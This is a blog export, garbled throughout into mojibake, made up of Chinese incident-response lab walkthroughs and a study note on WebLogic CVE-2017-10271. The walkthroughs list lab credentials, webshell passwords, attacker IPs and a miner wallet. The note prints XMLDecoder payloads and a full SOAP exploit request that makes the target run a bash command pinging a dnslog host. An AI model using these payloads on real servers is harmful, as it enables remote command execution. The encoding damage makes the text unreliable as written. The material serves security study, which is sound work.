å¦‚ä¸Šæ—¶é—´ä¸­ï¼Œalinotify.phpçš„ä¿®æ”¹æ—¶é—´æœ€ä¸ºç‰¹åˆ«ï¼ŒçŒœæµ‹æ˜¯é»‘å®¢å°†apiæ–‡ä»¶å¤¹å¤åˆ¶è¿‡æ¥ååˆå•ç‹¬å¯¹è¯¥æ–‡ä»¶è¿›è¡Œäº†æ›´æ”¹ï¼Œå› æ­¤æŸ¥çœ‹è¯¥æ–‡ä»¶è·å–flag2ï¼šflag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125; 7.è‡³äºéšè—çš„flag3ï¼Œä½äºhistoryä¸­ï¼š æˆ–è€…ç›´æ¥envæŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼š åº”æ€¥å“åº”é¶æœºâ€“Web1æŒ‘æˆ˜å†…å®¹å‰æ™¯éœ€è¦ï¼š å°æåœ¨å€¼å®ˆçš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æœ‰CPUå ç”¨é£™å‡ï¼Œå‡ºäºèƒ†å­å°ï¼Œå°±ç«‹åˆ»å°†æœåŠ¡å™¨å…³æœºï¼Œå¹¶æ‰¾æ¥æ­£åœ¨åƒè‹•çš®çš„hxdå¸®ä»–åˆ†æï¼Œè¿™æ˜¯ä»–çš„æœåŠ¡å™¨ç³»ç»Ÿï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ï¼Œå¹¶ä½œä¸ºé€šå…³æ¡ä»¶ï¼š 1.æ”»å‡»è€…çš„shellå¯†ç  2.æ”»å‡»è€…çš„IPåœ°å€ 3.æ”»å‡»è€…çš„éšè—è´¦æˆ·åç§° 4.æ”»å‡»è€…æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå(ä»…åŸŸå) 5.æœ‰å®åŠ›çš„å¯ä»¥å°è¯•ç€ä¿®å¤æ¼æ´ å‡­æ®ï¼šadministrator&#x2F;Zgsf@admin.com è§£é¢˜1.æ‰“å¼€è™šæ‹Ÿæœºçœ‹åˆ°phpstudyï¼Œæˆ‘ä»¬ç›´å¥”å…¶ç½‘ç«™æ ¹ç›®å½•ï¼Œç”¨ç«ç»’æŸ¥æ€å»æ‰«ï¼š å‘ç°shellï¼Œæˆ‘ä»¬å»æŸ¥çœ‹ï¼ˆæœ‰ç‚¹å°´å°¬ï¼Œæˆ‘åˆšæ‰«å®Œï¼Œç³»ç»Ÿè‡ªåŠ¨ç»™æˆ‘æŠŠğŸåˆ äº†ï¼Œæ²¡å¿«ç…§ï¼Œåªèƒ½é‡æ–°å¼€ä¸€æ¬¡äº†ï¼‰ å…¸å‹å†°èé©¬ï¼Œshellå¯†ç ä¸ºrebeyong 2.è¦è·å–æ”»å‡»è€…IPï¼Œç›´æ¥å»çœ‹æ—¥å¿—å°±å¥½äº†ï¼Œå»ç½‘ç«™æ ¹ç›®å½•æœlogï¼Œå‘ç°C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs\\access.logæœ‰ä¸œè¥¿ï¼š å¯¹ç€ç™»å½•é¡µé¢ä½¿åŠ²è¯·æ±‚ï¼Œç›²çŒœçˆ†ç ´è´¦å·å¯†ç ï¼Œæ•…192.168.126.1å³ä¸ºæ”»å‡»è€…IP 3.è¦æ‰¾æ”»å‡»è€…éšè—è´¦æˆ·åç§°ï¼Œç›´æ¥å»æ§åˆ¶é¢æ¿çœ‹å°±å¥½äº†ï¼š ä¹Ÿå¯ä»¥ç›´æ¥å»çœ‹æ³¨å†Œè¡¨æˆ–è€…äº‹ä»¶ç®¡ç†å™¨ï¼Œç”šè‡³ç›´æ¥å»çœ‹æ–‡ä»¶å¤¹é‡Œçš„ç”¨æˆ·ï¼š 4.è¦çœ‹æ”»å‡»è€…çŸ¿æ± ç¨‹åºçš„çŸ¿æ± åŸŸåï¼Œæˆ‘ä»¬å¾—å»æ¶æ„ç”¨æˆ·çš„æ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°çŸ¿æ± ç¨‹åºï¼š è¯¥å›¾æ ‡ä¸ºpyinstalleræ‰“åŒ…ï¼Œä½¿ç”¨pyinstxtractorè¿›è¡Œåç¼–è¯‘(https://github.com/extremecoders-re/pyinstxtractor) å†ä½¿ç”¨åœ¨çº¿pycåç¼–è¯‘pythonåç¼–è¯‘ - åœ¨çº¿å·¥å…· (tool.lu) å³å¯è·å–æºç è¿›è€Œå¾—åˆ°çŸ¿æ± åŸŸåï¼šwakuang.zhigongshanfang.top åº”æ€¥å“åº”é¶æœºâ€“Web2æŒ‘æˆ˜å†…å®¹å‰æ™¯éœ€è¦ï¼šå°æåœ¨æŸå•ä½é©»åœºå€¼å®ˆï¼Œæ·±å¤œ12ç‚¹ï¼Œç”²æ–¹å·²ç»å›å®¶äº†ï¼Œå°æåˆšå·å·æ‘¸é±¼åï¼Œå‘ç°å®‰å…¨è®¾å¤‡æœ‰å‘Šè­¦ï¼Œäºæ˜¯ç«‹åˆ»åœæ‰äº†æœºå™¨å¼€å§‹æ’æŸ¥ã€‚ è¿™æ˜¯ä»–çš„æœåŠ¡å™¨ç³»ç»Ÿï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ï¼Œå¹¶ä½œä¸ºé€šå…³æ¡ä»¶ï¼š 1.æ”»å‡»è€…çš„IPåœ°å€ï¼ˆä¸¤ä¸ªï¼‰ï¼Ÿ 2.æ”»å‡»è€…çš„webshellæ–‡ä»¶åï¼Ÿ 3.æ”»å‡»è€…çš„webshellå¯†ç ï¼Ÿ 4.æ”»å‡»è€…çš„ä¼ªQQå·ï¼Ÿ 5.æ”»å‡»è€…çš„ä¼ªæœåŠ¡å™¨IPåœ°å€ï¼Ÿ 6.æ”»å‡»è€…çš„æœåŠ¡å™¨ç«¯å£ï¼Ÿ 7.æ”»å‡»è€…æ˜¯å¦‚ä½•å…¥ä¾µçš„ï¼ˆé€‰æ‹©é¢˜ï¼‰ï¼Ÿ 8.æ”»å‡»è€…çš„éšè—ç”¨æˆ·åï¼Ÿ å‡­æ®ï¼šadministrator&#x2F;Zgsf@qq.com è§£é¢˜1.è¦çœ‹æ”»å‡»è€…çš„IPåœ°å€ï¼Œè¿˜æ˜¯å»çœ‹æ—¥å¿—ï¼š å…¶ä¸­ä¸€ä¸ªIPæ˜¯192.168.126.135ï¼Œè¿™ä¸ªæ˜¯ä¼ ğŸè¿ğŸçš„IPï¼Œè¿˜æœ‰ä¸€ä¸ªï¼ŒçŒœæµ‹æ˜¯è¿œç¨‹ç™»å½•çš„IPï¼Œç­‰ä¸‹è¾¹å†è¯´ 2.æ”»å‡»è€…çš„webshellæ–‡ä»¶åï¼Œå¾ˆç®€å•ï¼Œç›´æ¥æŠŠæ ¹ç›®å½•æ”¾ç«ç»’é‡Œæ‰«å°±è¡Œäº†ï¼šsystem.php 3.æ”»å‡»è€…webshellå¯†ç ç›´æ¥å»çœ‹æœ¨é©¬æ–‡ä»¶å³å¯ï¼šhack6618 4.æåˆ°QQå·ï¼Œè¿™å°±ä¸å¾—ä¸å»çœ‹Tencent Filesäº†ï¼Œä¹Ÿç®—æ˜¯QQçš„ä¸€ä¸ªç‰¹æ€§å§ï¼Œä¼šåœ¨è¯¥æ–‡ä»¶ä¸‹ä»¥QQå·ä¸ºååˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼š777888999321 5.æ”»å‡»è€…çš„ä¼ªæœåŠ¡å™¨IPï¼Œè¿™ä¸ªæ˜¯åœ¨QQæ¥æ”¶çš„æ–‡ä»¶ä¸­æ‰¾åˆ°çš„ï¼š255.256.66.88 6.ç«¯å£ä¹Ÿå‡ºæ¥äº†ï¼š65536ï¼ˆå½“ç„¶éƒ½æ˜¯ä¼ªçš„ï¼‰ 7.è‡³äºæ”»å‡»è€…æ˜¯æ€ä¹ˆæ‰“è¿›æ¥çš„ï¼Œè¿™ä¸ªå»ç¿»ç¿»æ—¥å¿—å°±çŸ¥é“äº†ï¼š åœ¨å›¾ä¸­æ–‡ä»¶é‡Œï¼Œæ”»å‡»è€…IPåå¤è¯·æ±‚FTPè¿›è¡Œç™»å½•çˆ†ç ´ï¼Œæœ€ç»ˆæˆåŠŸä»¥adminèº«ä»½ç™»å½• 8.è‡³äºéšè—ç”¨æˆ·åï¼Œæˆ‘ä»¬å»æ³¨å†Œè¡¨æŸ¥çœ‹å³å¯ï¼ŒWin+Rè¾“å…¥regeditï¼šhack887ï¼ˆåè¾¹çš„$ä¸ºéšè—çš„æ„æ€ï¼‰ ç°åœ¨ï¼Œæˆ‘ä»¬è¿˜å·®ç¬¬ä¸€é—®çš„å¦ä¸€ä¸ªIPåœ°å€ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹‹å‰å°±çŒœæµ‹æ˜¯è¿œç¨‹ç™»å½•ç”¨çš„IPï¼Œç°åœ¨æˆ‘ä»¬å¾—çŸ¥äº†æ”»å‡»è€…çš„éšè—ç”¨æˆ·ï¼Œæ¥ä¸‹æ¥å»äº‹ä»¶æŸ¥çœ‹å™¨å³å¯æŸ¥çœ‹å…¶å¦ä¸€ä¸ªIPï¼š192.168.126.129 è‡³æ­¤ï¼Œæœ¬é¶æœºç»“æŸ åº”æ€¥å“åº”é¶æœºâ€“Web3æŒ‘æˆ˜å†…å®¹å‰æ™¯éœ€è¦ï¼šå°è‹•åœ¨çœæŠ¤å€¼å®ˆä¸­ï¼Œåœ¨çµæœºä¸€åŠ¨æƒ…å†µä¸‹æŠŠè®¾å¤‡åœæ‰äº†ï¼Œç”²æ–¹é—®ï¼šä¸ºä»€ä¹ˆè¦åœè®¾å¤‡ï¼Ÿå°è‹•è¯´ï¼šæˆ‘ç¬¬å…­æ„Ÿå‘Šè¯‰æˆ‘ï¼Œè¿™æœºå™¨å¯èƒ½è¢«é»‘äº†ã€‚ è¿™æ˜¯ä»–çš„æœåŠ¡å™¨ï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ä½œä¸ºé€šå…³æ¡ä»¶ï¼š æ”»å‡»è€…çš„ä¸¤ä¸ªIPåœ°å€ éšè—ç”¨æˆ·åç§° é»‘å®¢é—ç•™ä¸‹çš„flagã€3ä¸ªã€‘ æœ¬è™šæ‹Ÿæœºçš„è€ƒç‚¹ä¸åœ¨éšè—ç”¨æˆ·ä»¥åŠipåœ°å€ï¼Œä»”ç»†æ‰¾æ‰¾æŠŠã€‚ å‡­æ®ï¼šadministrator&#x2F;xj@123456 è§£é¢˜ç¯å¢ƒæ²¡èµ·å‡ºæ¥ï¼Œç›´æ¥çœ‹å®˜æ–¹é¢˜è§£äº†ï¼š https://mp.weixin.qq.com/mp/wappoc_appmsgcaptcha?poc_token=HLwhV2aj1vpy_D8q_3g_qGiJjIPIyisfz6bgKTEs&amp;target_url=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FYvCL27cfX5pfD0LiVt4EeA ä¸‹é¢å†™ä¸€ä¸‹çœ‹å®Œåçš„æ€»ç»“ï¼š 1.æ”»å‡»è€…IPåœ°å€ç›´æ¥å»æ—¥å¿—æ–‡ä»¶çœ‹ 2.éšè—ç”¨æˆ·å¯ä»¥å»æ§åˆ¶é¢æ¿ï¼Œä¹Ÿå¯å»æ³¨å†Œè¡¨ç­‰æŸ¥çœ‹ 3.ä»»åŠ¡è®¡åˆ’ç¨‹åºé‡Œå¯èƒ½ä¼šçœ‹åˆ°å¯ç–‘ä»»åŠ¡ï¼Œè¿›è€ŒæŸ¥çœ‹å¯ç–‘ä»»åŠ¡çš„å…·ä½“å†…å®¹ä¼šæœ‰æ”¶è· 4.Webåº”ç”¨ä¸­å¯èƒ½å­˜åœ¨æ˜æ˜¾çš„æ¼æ´å¯¼è‡´å·²ç»è¢«é»‘å®¢å…¥ä¾µï¼Œä¾‹å¦‚æœ¬é¢˜ä¸­çš„Z-blog åº”æ€¥å“åº”é¶æœºâ€“è¿‘æºæ¸—é€OS-1æŒ‘æˆ˜å†…å®¹å‰æ™¯éœ€è¦ï¼šå°ç‹ä»æŸå®‰å…¨å¤§å‚è¢«ä¼˜åŒ–æ‰åï¼Œæ¥åˆ°äº†æŸç§ç«‹å°å­¦å½“èµ·äº†è®¡ç®—æœºè€å¸ˆã€‚æŸä¸€å¤©ä¸Šè¯¾çš„æ—¶å€™ï¼Œå‘ç°é¼ æ ‡åœ¨è‡ªå·±åŠ¨å¼¹ï¼Œåˆå‘ç°é™¤äº†æŸå°ç”µè„‘ï¼Œå…¶ä»–ç”µè„‘è¿ä¸ä¸Šç½‘ç»œã€‚æ„Ÿè§‰è‚¯å®šæœ‰å­¦ç”Ÿæ£ä¹±ï¼Œäºæ˜¯å¼€å¯äº†åº”æ€¥ã€‚ 1.æ”»å‡»è€…çš„å¤–ç½‘IPåœ°å€ 2.æ”»å‡»è€…çš„å†…ç½‘è·³æ¿IPåœ°å€ 3.æ”»å‡»è€…ä½¿ç”¨çš„é™é€Ÿè½¯ä»¶çš„md5å¤§å†™ 4.æ”»å‡»è€…çš„åé—¨md5å¤§å†™ 5.æ”»å‡»è€…ç•™ä¸‹çš„flag å‡­æ®ï¼šAdministrator&#x2F;zgsf@2024 è§£é¢˜ç›´æ¥CMD mstscè¿œç¨‹æ¡Œé¢è¿æ¥äº† 1.æŠŠæ¡Œé¢æ–‡ä»¶æ”¾åˆ°å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒé‡Œè¿›è¡Œåˆ†æï¼Œå‘ç°å¦‚ä¸‹æ–‡ä»¶å­˜åœ¨æ¶æ„å®ï¼Œä¸”å­˜åœ¨æ”»å‡»è€…çš„å¤–ç½‘IPï¼š8.219.200.130 2.è‡³äºå…¶å†…ç½‘IPï¼Œæ²¡å•¥æ€è·¯ï¼Œå»çœ‹çœ‹æœ‰æ— éšè—æ–‡ä»¶ä»€ä¹ˆçš„ï¼ŒæŠŠæ–‡ä»¶å¤¹ä¸­æ”¹æˆæ˜¾ç¤ºéšè—æ–‡ä»¶ï¼š å‘ç°éšè—æ–‡ä»¶ï¼š æ”»å‡»è€…å†…ç½‘IPï¼š192.168.20.129 3.è‡³äºé™é€Ÿè½¯ä»¶ï¼Œæˆ‘ä»¬åªèƒ½å»ç¿»Cç›˜æ–‡ä»¶å‘ç°å¯ç–‘æ–‡ä»¶ï¼šC:\\PerfLogs\\666\\666\\777\\666\\666\\666\\666\\666\\666\\666\\666\\666\\666\\666\\p2pover4.34.exeã€ ç„¶åå»æœç´¢å¼•æ“æœä¸€ä¸‹ï¼š é™é€Ÿæ–‡ä»¶å°±æ˜¯å®ƒäº†ï¼Œè‡³äºMD5ï¼Œä¸¢å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒå°±å‡ºæ¥äº† 4.åé—¨åœ¨5æ¬¡shifté”®é‡Œï¼Œè€Œå…¶åé—¨æ–‡ä»¶è‡ªç„¶å°±æ˜¯æ”»å‡»è€…æ›¿æ¢äº†C:\\Windows\\System32\\sethc.exeæ–‡ä»¶ï¼š 5.flagå¦‚ä¸Šå¦‚æ‰€ç¤ºï¼ŒæŒ‰5æ¬¡shifté”®å°±å‡ºæ¥äº† åº”æ€¥å“åº”é¶æœºâ€“æŒ–çŸ¿æŒ‘æˆ˜å†…å®¹å‰æ™¯éœ€è¦ï¼šæœºæˆ¿è¿ç»´å°é™ˆï¼Œä¸‹ç­åå‘ç°è¿˜æœ‰å·¥ä½œæ²¡å®Œæˆï¼Œç„¶åä¸Šæœºå™¨è¶Šç”¨è¶Šå¡ï¼Œè¯·ä½ å¸®ä»–çœ‹çœ‹åŸå› ã€‚ æŒ‘æˆ˜å†…å®¹ï¼š æ”»å‡»è€…çš„IPåœ°å€ æ”»å‡»è€…å¼€å§‹æ”»å‡»çš„æ—¶é—´ æ”»å‡»è€…æ”»å‡»çš„ç«¯å£ æŒ–çŸ¿ç¨‹åºçš„md5 åé—¨è„šæœ¬çš„md5 çŸ¿æ± åœ°å€ é’±åŒ…åœ°å€ æ”»å‡»è€…æ˜¯å¦‚ä½•æ”»å‡»è¿›å…¥çš„ å‡­æ®ï¼šAdministrator&#x2F;zgsf@123 è§£é¢˜æ²¡æœ‰å®‰è£…vmware Toolsï¼Œç›´æ¥mstscè¿æ¥å³å¯ï¼Œæœ€è¿‘æ–°å®‰äº†è“é˜Ÿåº”æ€¥å“åº”å·¥å…·ç®±ï¼Œæ­£å¥½è¯•ä¸€è¯• 1.å¯è§ç™»å½•å¤±è´¥çš„æ—¥å¿—ä¸­IPï¼š192.168.115.131åå¤å‡ºç°ï¼Œæ•…å¯çŒœæµ‹è¯¥IPä¸ºæ”»å‡»è€…IP 2.è‡³äºå¼€å§‹æ”»å‡»çš„æ—¶é—´ï¼Œç›´æ¥å»çœ‹ä¸Šå›¾çš„Dateï¼š2024-05-21 20:25:22 3.è‡³äºæ”»å‡»è€…æ”»å‡»çš„ç«¯å£ï¼Œè¿˜æ˜¯çœ‹ä¸Šè¾¹é‚£ä¸ªå›¾ï¼ŒWorkstationæ˜¾ç¤ºNtLmSapï¼Œç»æœç´¢å¾—çŸ¥æ˜¯æ”»å‡»è€…çˆ†ç ´3389ç«¯å£ 4.è‡³äºæŒ–çŸ¿ç¨‹åºmd5ï¼Œå»ä»»åŠ¡ç®¡ç†å™¨é‡Œæ‰¾ï¼š å°±è¿™ä¸ªèµ„æºå ç”¨æœ€å¤šï¼Œç›´æ¥è®¡ç®—hash 5.è‡³äºåé—¨è„šæœ¬ï¼Œç”¨ç«ç»’å‰‘æ‰«ï¼š å‘ç°å¯ç–‘æ–‡ä»¶ï¼Œæ‰“å¼€çœ‹çœ‹ï¼š ä¸€çœ¼ä¸C3PoolæŒ–çŸ¿æœ‰å…³ï¼Œæ•…æ­¤ä¸ºæŒ–çŸ¿è„šæœ¬ï¼Œè®¡ç®—å…¶hashå³å¯ 5.çŸ¿æ± åœ°å€å¦‚ä¸Šå›¾æ‰€ç¤ºï¼šc3pool.org 6.é’±åŒ…åœ°å€ä¹Ÿå¦‚ä¸Šå›¾æ‰€ç¤ºï¼š4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y 7.æ”»å‡»è€…å¦‚ä½•è¿›å…¥çš„ï¼Œè¿™ä¸ªå…¶å®å‰è¾¹å·²ç»æåˆ°äº†ï¼šæš´åŠ›ç ´è§£3389è¿œç¨‹ç™»å½•å¯†ç ï¼Œå¡«æš´åŠ›ç ´è§£å³å¯","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:Weblogicä¹‹CVE-2017-10271_XMLDecoderæ¼æ´","slug":"JAVAå®‰å…¨Weblogicä¹‹CVE-2017-10271_XMLDecoderæ¼æ´","date":"2024-05-02T03:32:26.185Z","updated":"2024-05-02T07:28:39.374Z","comments":true,"path":"2024/05/02/JAVAå®‰å…¨Weblogicä¹‹CVE-2017-10271_XMLDecoderæ¼æ´/","link":"","permalink":"http://example.com/2024/05/02/JAVA%E5%AE%89%E5%85%A8Weblogic%E4%B9%8BCVE-2017-10271_XMLDecoder%E6%BC%8F%E6%B4%9E/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;5&#x2F;2 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;5&#x2F;2 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€ç›´æ¥è·Ÿç€Drunkbabyä½¬æ•´ç†çš„å­¦ä¹ è·¯çº¿å¼€å§‹å­¦äº†ï¼Œæœ¬æ–‡è®°å½•ä¸€ä¸‹å­¦ä¹ è¿‡ç¨‹ æ­£æ–‡XMLDecoderå¯ä»¥è¯»å–XMLEncoderç”Ÿæˆçš„XMLæ–‡æ¡£è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œç±»ä¼¼äºFastjsonä¸­çš„jsonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– ç¤ºä¾‹é¦–å…ˆç”Ÿæˆä¸€ä¸ªxmlæ–‡æ¡£ï¼š 1234567891011121314import javax.swing.*;import java.io.BufferedOutputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.beans.XMLEncoder;public class XMLEncoder_test &#123; public static void main(String[] args) throws FileNotFoundException &#123; FileOutputStream file = new FileOutputStream(&quot;result.xml&quot;); XMLEncoder xmlEncoder = new XMLEncoder(new BufferedOutputStream(file)); xmlEncoder.writeObject(new JButton(&quot;2333333&quot;)); xmlEncoder.close(); &#125;&#125; ç”Ÿæˆçš„result.xmlå¦‚ä¸‹ï¼š 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;javax.swing.JButton&quot;&gt; &lt;string&gt;2333333&lt;/string&gt; &lt;/object&gt;&lt;/java&gt; ä¹‹åä½¿ç”¨XMLDecoderååºåˆ—åŒ–å³å¯ï¼š 1234567891011121314import java.io.BufferedInputStream;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.beans.XMLDecoder;public class XMLDecoder_test &#123; public static void main(String[] args) throws FileNotFoundException &#123; FileInputStream file = new FileInputStream(&quot;result.xml&quot;); XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file)); Object o = xmlDecoder.readObject(); System.out.println(o); xmlDecoder.close(); &#125;&#125; è¾“å‡ºï¼š ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ é—®é¢˜ï¼šç°åœ¨æœ‰ç‚¹ç–‘æƒ‘ç½‘ä¸Šçš„æ¶æ„xmlæ–‡æ¡£æ˜¯è‡ªå·±ç¼–å†™çš„è¿˜æ˜¯ç”¨XMLEncoderç”Ÿæˆçš„ï¼Œå› ä¸ºæˆ‘è‡ªå·±ç¼–å†™Javaç”Ÿæˆè¿™ä¸ªçš„æ—¶å€™å‡ºäº†äº›é—®é¢˜ï¼Œæ„Ÿè§‰æ— æ³•å¤ç°ï¼Œç½‘ä¸Šæµä¼ çš„æ¶æ„xmlæ–‡æ¡£éƒ½æ˜¯ç›´æ¥ç»™å‡ºçš„xmlï¼Œæ²¡XMLEncoderçš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;Calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt; XMLDecoderè§£æåä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼š åæ¥é—®äº†é—®Drunkbabyå¸ˆå‚…ï¼Œè¿™ç§éƒ½æ˜¯ç›´æ¥ç¼–å†™çš„xmlæ–‡æ¡£ï¼Œé‚£å°±è¦å­¦ä¸€ä¸‹xmlçš„æ ¼å¼äº† ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ XMLåŸºç¡€è¿™é‡Œä¸»è¦æ˜¯çœ‹ä¸€äº›å¸¸ç”¨çš„xmlæ ‡ç­¾ï¼Œå…¶å®ç½‘ä¸Šçš„éƒ½å¤§åŒå°å¼‚ï¼ŒçŸ¥é“æ€ä¹ˆç”¨å°±è¡Œ stringæ ‡ç­¾é€šå¸¸ä½œä¸ºå­æ ‡ç­¾å……å½“å‚æ•°ï¼Œä¾‹å¦‚ï¼š 123456 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;javax.swing.JButton&quot;&gt; &lt;string&gt;2333333&lt;/string&gt; &lt;/object&gt;&lt;/java&gt; objectæ ‡ç­¾objectè¡¨ç¤ºå¯¹è±¡ï¼Œé€šå¸¸ç”¨æ¥æŒ‡å®šè°ƒç”¨çš„ç±»ï¼Œä¾‹å¦‚ï¼š 123&lt;object class=&quot;javax.swing.JButton&quot;&gt; &lt;string&gt;2333333&lt;/string&gt;&lt;/object&gt; voidæ ‡ç­¾voidæ ‡ç­¾ç”¨å¤„æ¯”è¾ƒå¹¿æ³›ï¼Œå¯ç”¨äºå‡½æ•°æˆ–è€…ç±»çš„è°ƒç”¨ï¼Œä»¥åŠèµ‹å€¼ç­‰ï¼Œä¾‹å¦‚ï¼š 1234567&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;Calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt; arrayæ ‡ç­¾arrayè¡¨ç¤ºæ•°ç»„ï¼Œè¡¨æ˜äº†æ•°ç»„çš„ç±»å‹å’Œé•¿åº¦ç­‰ï¼Œå†…éƒ¨å¯ç”¨voidæ ‡ç­¾çš„indexå±æ€§æŒ‡å®šå¯¹åº”ç´¢å¼•ä½¿ç”¨stringæ ‡ç­¾è¿›è¡Œèµ‹å€¼ï¼Œä¾‹å¦‚ï¼š 12345&lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;Calc&lt;/string&gt; &lt;/void&gt;&lt;/array&gt; ç¯å¢ƒæ­å»ºå› ä¸ºè¿™ä¸ªæ¼æ´ä¸»è¦é’ˆå¯¹çš„æ˜¯WebLogicä¸­WLS-WebServicesçš„ç»„ä»¶ï¼Œæ‰€ä»¥ç”¨ä¹‹å‰çš„ç¯å¢ƒå°±å¤Ÿäº† è¯¦æƒ…è¯·çœ‹ä¸Šä¸€ç¯‡æ–‡ç« ï¼šJAVAå®‰å…¨:Weblogicä¹‹CVE-2015-4852ååºåˆ—åŒ–æ¼æ´ | Narcherã®å°çª æ¼æ´å¤ç°WebLogicçš„æ¥å£&#x2F;wls-wsat&#x2F;CoordinatorPortTypeå¯ä»¥æ¥æ”¶XMLçš„æ•°æ®åŒ…ï¼Œåªæ˜¯éœ€è¦ç”¨SOAPå‹çš„æ ¼å¼è¿›è¡Œä¸€äº›åŒ…è£…å³å¯ æ•°æ®åŒ…å¦‚ä¸‹ï¼Œç›´æ¥ç”¨çš„Drunkbabyå¸ˆå‚…çš„pocï¼š 123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.58.128:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: rememberMe=0P214RoHwjsUeSFEpelw10AyENEhVPUZ7Nz6zTsrGCqNikS9UAjsjoU66N22+jnpKV6cPMvTbMIC8POClLrLraGBSUnEWJHhsSLRr6Em+FigyKn1cUyoV3QXhkfQQlt5JxsIZUvTyx9xHvtHCAQE/FQv0TSwVY/4I4DUBJ82qxchbVo7/bqpd8EUGLnZWIuj1+RLfHC4BRV6hj89QKWBWHajSZ1ni24DmoyCCA5nphp4xiulIU/KshFs8bC3enUuPA2/MMywqZWmY0IjOtw+JkXULgbE3DDlU5Mw9jQnA6Z1HjVX2hbLwr//wi/2KOEgYd4Ssieu1IgA7qVk4Hty3BkEGf9A+u/Y33LVioO2Sy/NFr+rywQwQqNqjmA3vGWzdQ1WucoEsCrlcn84ax/DehCba2PLDCOl8sT9qn/fhhWIdoemS8s1UPHWWXqxNjg5tySUUq0TQjWngVCnd4eAtq04oHXj4UthTJHA1jeeQzAK+LLyiziWgI4ZV0s2G6eiM7NqfKAJl1/GjrE59GL2JQ==; ADMINCONSOLESESSION=l8XsmzwdZMP8W1yn0766JTGwf3G2k2NQpl3Z9C25dFqTQ7vsGty0!1153042568Upgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 646&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;1&quot;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;2&quot;&gt; &lt;string&gt;ping aaa.9y1gq6.dnslog.cn&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; å‘ç°æ‰“é€šäº†ï¼ˆè¿™é‡Œçš„æ ¼å¼è¦æ±‚æœ‰ç‚¹æ€ªï¼Œæˆ‘åˆ äº†å‡ ä¸ªç©ºæ 